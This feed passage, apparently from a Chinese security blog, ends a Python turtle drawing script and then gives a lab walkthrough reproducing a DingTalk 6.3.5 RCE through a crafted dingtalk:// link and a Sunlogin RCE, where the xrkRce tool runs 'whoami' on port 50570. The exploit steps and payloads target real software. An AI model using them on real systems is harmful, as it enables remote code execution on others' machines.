punctuation">)</span></pre></td></tr><tr><td data-num="280"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="281"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">165</span><span class="token punctuation">,</span> <span class="token number">150</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="282"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="283"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">250</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="284"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">138</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="285"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="286"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">131</span><span class="token punctuation">,</span> <span class="token number">116</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="287"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"slateblue"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="288"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="289"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="290"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">160</span><span class="token punctuation">,</span> <span class="token number">144</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="291"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">78</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="292"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">242</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="293"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">135</span><span class="token punctuation">,</span> <span class="token number">105</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="294"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="295"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">127</span><span class="token punctuation">,</span> <span class="token number">112</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="296"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"orangered"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="297"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="298"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="299"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">155</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="300"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">116</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="301"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="302"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">134</span><span class="token punctuation">,</span> <span class="token number">103</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="303"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="304"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">123</span><span class="token punctuation">,</span> <span class="token number">108</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="305"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"gold"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="306"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="307"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="308"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">150</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="309"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">104</span><span class="token punctuation">,</span> <span class="token number">86</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="310"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="311"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">126</span><span class="token punctuation">,</span> <span class="token number">102</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="312"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="313"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">104</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="314"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"greenyellow"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="315"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="316"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">60</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="317"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">145</span><span class="token punctuation">,</span> <span class="token number">136</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="318"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">90</span><span class="token punctuation">,</span> <span class="token number">83</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="319"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="320"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">120</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="321"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="322"></td><td><pre></pre></td></tr><tr><td data-num="323"></td><td><pre><span class="token comment"># 爱心</span></pre></td></tr><tr><td data-num="324"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="325"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">220</span><span class="token punctuation">,</span> <span class="token number">115</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="326"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"brown"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="327"></td><td><pre>turtle<span class="token punctuation">.</span>pensize<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="328"></td><td><pre>turtle<span class="token punctuation">.</span>fillcolor<span class="token punctuation">(</span><span class="token string">"brown"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="329"></td><td><pre>turtle<span class="token punctuation">.</span>begin_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="330"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="331"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">36</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="332"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="333"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="334"></td><td><pre>turtle<span class="token punctuation">.</span>setheading<span class="token punctuation">(</span><span class="token number">110</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="335"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">60</span><span class="token punctuation">,</span> <span class="token number">24</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="336"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">180</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="337"></td><td><pre>turtle<span class="token punctuation">.</span>end_fill<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="338"></td><td><pre></pre></td></tr><tr><td data-num="339"></td><td><pre><span class="token comment"># 五环</span></pre></td></tr><tr><td data-num="340"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="341"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="342"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="343"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"blue"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="344"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="345"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="346"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="347"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="348"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="349"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="350"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="351"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">25</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">170</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="352"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="353"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"brown"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="354"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="355"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="356"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">175</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="357"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="358"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"lightgoldenrod"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="359"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="360"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="361"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">175</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="362"></td><td><pre>turtle<span class="token punctuation">.</span>pendown<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="363"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"green"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="364"></td><td><pre>turtle<span class="token punctuation">.</span>circle<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="365"></td><td><pre>turtle<span class="token punctuation">.</span>penup<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="366"></td><td><pre></pre></td></tr><tr><td data-num="367"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="368"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">140</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="369"></td><td><pre>turtle<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"21r000"</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Arial'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'bold italic'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="370"></td><td><pre>turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="371"></td><td><pre></pre></td></tr><tr><td data-num="372"></td><td><pre>turtle<span class="token punctuation">.</span>pencolor<span class="token punctuation">(</span><span class="token string">"black"</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="373"></td><td><pre>turtle<span class="token punctuation">.</span>goto<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">16</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">160</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="374"></td><td><pre>turtle<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token string">"BEIJING 2022"</span><span class="token punctuation">,</span> font<span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'Arial'</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token string">'bold italic'</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="375"></td><td><pre>turtle<span class="token punctuation">.</span>hideturtle<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="376"></td><td><pre></pre></td></tr><tr><td data-num="377"></td><td><pre>turtle<span class="token punctuation">.</span>done<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>SNote</category>
      </categories>
      <tags>
        <tag>SNote</tag>
      </tags>
  </entry>
  <entry>
    <title>Dingtalk6.3.5 and 向日葵RCE复现</title>
    <url>/article/1b0513b6.html</url>
    <content><![CDATA[<h1 id="dingtalk635-rce"><a class="anchor" href="#dingtalk635-rce">#</a> Dingtalk6.3.5  RCE</h1>
<h2 id="项目地址"><a class="anchor" href="#项目地址">#</a> 项目地址</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NyYXp5MHg3MC9kaW5ndGFsay1SQ0U=">项目链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217133733650.png" alt="image-20220217133733650" /></p>
<h2 id="项目测试"><a class="anchor" href="#项目测试">#</a> 项目测试</h2>
<p>将 <code>test.html</code>  放入 XP 的网站目录当中</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217134128115.png" alt="image-20220217134128115" /></p>
<p>在虚拟机中启动 XP</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217133001242.png" alt="image-20220217133001242" /></p>
<p>在钉钉中随便打开一个会话窗口，发送 payload，然后点击 payload</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>dingtalk://dingtalkclient/page/link?url<span class="token operator">=</span><span class="token number">127.0</span>.0.1/test.html<span class="token operator">&amp;</span><span class="token assign-left variable">pc_slide</span><span class="token operator">=</span>true</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">#127.0.0.1 依据测试 IP 进行更改即可</span></pre></td></tr></table></figure><p>如此时虚拟机的测试 IP 为 &quot;192.168.146.139&quot;</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217134336105.png" alt="image-20220217134336105" /></p>
<p>在钉钉中输入 payload</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>dingtalk://dingtalkclient/page/link?url<span class="token operator">=</span><span class="token number">192.168</span>.146.139/test.html<span class="token operator">&amp;</span><span class="token assign-left variable">pc_slide</span><span class="token operator">=</span>true</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217134659616.png" alt="image-20220217134659616" /></p>
<p>点击 payload，有窗口弹出</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217134810503.png" alt="image-20220217134810503" /></p>
<p>后电脑计算器弹出</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217134841513.png" alt="image-20220217134841513" /></p>
<h1 id="向日葵rce"><a class="anchor" href="#向日葵rce">#</a> 向日葵 RCE</h1>
<h2 id="漏洞描述"><a class="anchor" href="#漏洞描述">#</a> 漏洞描述</h2>
<p>向日葵是一款免费的，集远程控制电脑手机、远程桌面连接、远程开机、远程管理、支持内网穿透的一体化远程控制管理工具软件。</p>
<p>上海贝锐信息科技股份有限公司向日葵个人版 for Windows 存在命令执行漏洞，攻击者可利用该漏洞获取服务器控制权。</p>
<h2 id="存在漏洞版本"><a class="anchor" href="#存在漏洞版本">#</a> 存在漏洞版本</h2>
<p>上海贝锐信息科技股份有限公司 向日葵个人版 for Windows 11.0.0.33 &lt;=</p>
<p>上海贝锐信息科技股份有限公司 向日葵简约版 V1.0.1.43315（2021.12）</p>
<h2 id="项目地址-2"><a class="anchor" href="#项目地址-2">#</a> 项目地址</h2>
<p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NpYmVyaWFoMGgvQ1ZFLUNOVkQtSFVC">项目链接</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217135040014.png" alt="image-20220217135040014" /></p>
<h2 id="漏洞复现"><a class="anchor" href="#漏洞复现">#</a> 漏洞复现</h2>
<h3 id="项目安装"><a class="anchor" href="#项目安装">#</a> 项目安装</h3>
<p>下面我们来对漏洞进行相关复现，将上面的项目下载后得到以下内容</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217135608164.png" alt="image-20220217135608164" /></p>
<p>双击向日葵安装应用进行向日葵 Ver.11.0.0.33162 的安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217140003186.png" alt="image-20220217140003186" /></p>
<h3 id="漏洞检测"><a class="anchor" href="#漏洞检测">#</a> 漏洞检测</h3>
<p>使用 sunlogin_rce 工具来检测该漏洞，因为该工具使用 Go 语言编写，所以在使用之前我们需要安装 Go 环境</p>
<h4 id="环境安装"><a class="anchor" href="#环境安装">#</a> 环境安装</h4>
<h5 id="kali中安装go环境"><a class="anchor" href="#kali中安装go环境">#</a> kali 中安装 go 环境</h5>
<p>下载安装包</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">wget</span> -c https://storage.googleapis.com/golang/go1.8.3.linux-amd64.tar.gz</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217140733168.png" alt="image-20220217140733168" /></p>
<p>下载完后，解压到  <code>/usr/local</code>  目录下</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">tar</span> -C /usr/local/ -xzf go1.8.3.linux-amd64.tar.gz</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217140850736.png" alt="image-20220217140850736" /></p>
<p>vim 打开文件.profile</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token function">vim</span> /etc/profile</pre></td></tr></table></figure><p>在文件内容后面加上 <code>export PATH=$PATH:/usr/local/go/bin</code>  后保存</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217141300051.png" alt="image-20220217141300051" /></p>
<p>执行以下命令，使环境变量立即生效</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token builtin class-name">source</span> /etc/profile</pre></td></tr></table></figure><p>这样 kali 下的 go 环境就安装成功了</p>
<p>查看 go 版本</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go version</pre></td></tr></table></figure><p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217141349520.png" alt="image-20220217141349520" /></p>
<h5 id="windows下安装go环境"><a class="anchor" href="#windows下安装go环境">#</a> windows 下安装 go 环境</h5>
<p>去<span class="exturl" data-url="aHR0cHM6Ly9zdHVkeWdvbGFuZy5jb20vZGw=">中文社区的下载栏目</span></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144113981.png" alt="image-20220217144113981" /></p>
<p>找到 Microsoft Windows，下载完成之后，一步步安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144219485.png" alt="image-20220217144219485" /></p>
<p>等待安装</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144325749.png" alt="image-20220217144325749" /></p>
<p>安装完成之后，进到 Dos 也就是 cmd 中，输入 <code>go env</code></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144412533.png" alt="image-20220217144412533" /></p>
<p>然后配置环境变量，GOPATH，也就是指向 GO 的安装目录文件夹</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144618049.png" alt="image-20220217144618049" /></p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144746113.png" alt="image-20220217144746113" /></p>
<p>配置 Go 项目存放地址</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217144917859.png" alt="image-20220217144917859" /></p>
<h4 id="项目测试-2"><a class="anchor" href="#项目测试-2">#</a> 项目测试</h4>
<p>使用 <code>go build</code>  进行编译</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217145212672.png" alt="image-20220217145212672" /></p>
<p>报错 QAQ</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go: github.com/EDDYCJY/fake-useragent@v0.2.0: Get <span class="token string">"https://proxy.golang.org/github.com/%21e%21d%21d%21y%21c%21j%21y/fake-useragent/@v/v0.2.0.mod"</span><span class="token builtin class-name">:</span> dial tcp <span class="token number">172.217</span>.163.49:443: connectex: No connection could be made because the target machine actively refused it.</pre></td></tr><tr><td data-num="2"></td><td><pre>go: downloading github.com/go-resty/resty/v2 v2.7.0</pre></td></tr><tr><td data-num="3"></td><td><pre>go: downloading github.com/tidwall/gjson v1.14.0</pre></td></tr><tr><td data-num="4"></td><td><pre>go: github.com/EDDYCJY/fake-useragent@v0.2.0: Get <span class="token string">"https://proxy.golang.org/github.com/%21e%21d%21d%21y%21c%21j%21y/fake-useragent/@v/v0.2.0.mod"</span><span class="token builtin class-name">:</span> dial tcp <span class="token number">172.217</span>.163.49:443: connectex: No connection could be made because the target machine actively refused it.</pre></td></tr></table></figure><p>默认使用的是 <code>proxy.golang.org</code> ，在国内无法访问</p>
<p>换一个国内能访问的代理地址：<span class="exturl" data-url="aHR0cHM6Ly9nb3Byb3h5LmNu">https://goproxy.cn</span></p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>go <span class="token function">env</span> -w <span class="token assign-left variable">GOPROXY</span><span class="token operator">=</span>https://goproxy.cn</pre></td></tr></table></figure><p>再次执行即可完美通过！</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217152431742.png" alt="image-20220217152431742" /></p>
<p>可以发现我们在编译之后文件夹中多出了 xrkRce 的文件。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217152454308.png" alt="image-20220217152454308" /></p>
<p>我们可以使用命令： <code>.\xrkRce.exe -h</code>  来查看使用方法。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217152531184.png" alt="image-20220217152531184" /></p>
<p>我们使用命令：</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./xrkRce.exe -h <span class="token number">192.168</span>.146.139</pre></td></tr></table></figure><p>来扫描安装漏洞版向日葵的目标主机 ( <code>192.168.146.139</code> )，发现其 <code>50570</code>  端口存在 Rce 漏洞。</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217152815908.png" alt="image-20220217152815908" /></p>
<p>我们使用以下命令来进行验证</p>
<figure class="highlight shell"><figcaption data-lang="Bash"></figcaption><table><tr><td data-num="1"></td><td><pre>./xrkRce.exe -h <span class="token number">192.168</span>.146.139 -t rce -p <span class="token number">50570</span> -c <span class="token string">"whoami"</span></pre></td></tr></table></figure><p>发现其成功执行 <code>whoami</code>  命令</p>
<p><img data-src="https://gitee.com/Is21r000/image/raw/master/picgo/image-20220217152956568.png" alt="image-20220217152956568" /></p>
<h1 id="注意事项"><a class="anchor" href="#注意事项">#</a> 注意事项</h1>
<p><code>该项目仅可用于研究使用,切勿用于非法犯罪活动,未经双方同意使用此项目攻击目标是非法的.</code></p>
]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu18.04中搭建AWD平台-AoiAWD记录</title>
    <url>/article/48abdb5.html</url>
    <content><![CDATA[<h1 id="aoiawd-轻量级edr系统"><a class="anchor" href="#aoiawd-轻量级edr系统">#</a> AoiAWD - 轻量级 EDR 系统</h1>
